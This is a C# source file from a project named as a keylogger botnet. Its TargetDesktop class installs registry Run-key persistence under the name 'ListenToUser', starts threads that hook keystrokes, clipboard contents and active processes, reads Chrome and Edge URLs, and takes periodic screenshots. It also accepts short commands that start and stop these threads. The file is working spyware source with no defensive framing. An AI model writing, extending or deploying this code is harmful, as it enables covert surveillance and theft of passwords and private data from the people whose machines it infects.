using Microsoft.Win32;
using System;
using System.Collections.Generic;
using System.Linq;
using System.Text;
using System.Threading;
using System.Threading.Tasks;
using System.Windows.Forms;

namespace KeyLoggerVersion1._0.botNet
{
    class TargetDesktop
    {
        public Thread threadtime;
        public Thread thread;
        public Thread thread1;
        public Thread thread2;
        public Thread threadEdge;
        public Thread threadChrome;

        private static TargetDesktop _Instance;

        public static TargetDesktop Instance 
        {
            get
            {
                if (_Instance == null)
                {
                    _Instance = new TargetDesktop();
                }
                return _Instance;
            }
            private set
            {

            } 
        }
        public TargetDesktop() {}
        #region StartUpOS
        public void StartWithOS()
        {
            RegistryKey regkey = Registry.CurrentUser.CreateSubKey("Software\\ListenToUser");
            RegistryKey regstart = Registry.CurrentUser.CreateSubKey("SOFTWARE\\Microsoft\\Windows\\CurrentVersion\\Run");
            string keyvalue = "1";
            try
            {
                regkey.SetValue("Index", keyvalue);
                regstart.SetValue("ListenToUser", Application.StartupPath + "\\" + Application.ProductName + ".exe");
                regkey.Close();
            }
            catch (Exception ex)
            {
                ex.ToString();
            }
        }
        #endregion
        #region SetTimerForTakeScreenshotAndBrowserHistory
        public void StartTimer(int timer)
        {
            threadtime = new Thread(() =>
            {
                while (true)
                {
                    Thread.Sleep(timer);
                    BrowserHistory.Instance.ClearList();
                    TakeScreenShot.Instance.CaptureAndSave(null, CaptureMode.Screen, null);
                }
            });
            threadtime.IsBackground = true;
            threadtime.Start();
        }
        #endregion
        #region ProcessThreadofKeylog
        [STAThread]
        public void RunThread(string request)
        {
            if (request == "a")
            {
                thread = new Thread(HookKeyboard.SetHookKeyBoard);
                thread.TrySetApartmentState(ApartmentState.STA);
                thread.Start();

                thread1 = new Thread(ClipboardNotification.NotificationForm.SetHookClipboard);
                thread1.TrySetApartmentState(ApartmentState.STA);
                thread1.Start();

                thread2 = new Thread(HookActiveProcess.NotificationWhenActivate);
                thread2.TrySetApartmentState(ApartmentState.STA);
                thread2.Start();

                //thread3 = new Thread(new BrowserHistory().HookHistoryBrowser);
                //thread3.TrySetApartmentState(ApartmentState.STA);
                //thread3.Start();

                threadEdge = new Thread(BrowserHistory.Instance.GetEdgeUrl);
                threadEdge.TrySetApartmentState(ApartmentState.STA);
                threadEdge.Start();

                threadChrome = new Thread(BrowserHistory.Instance.GetUrlChrome);
                threadChrome.TrySetApartmentState(ApartmentState.STA);
                threadChrome.Start();
            }
            if (request == "s")
            {
                thread.Abort();
            }
            if (request == "s1")
            {
                thread1.Abort();
            }
            if (request == "s2")
            {
                thread2.Abort();
            }
            if (request == "s3")
            {
                threadEdge.Abort();
                threadChrome.Abort();
            }
        }
        #endregion
    }
}
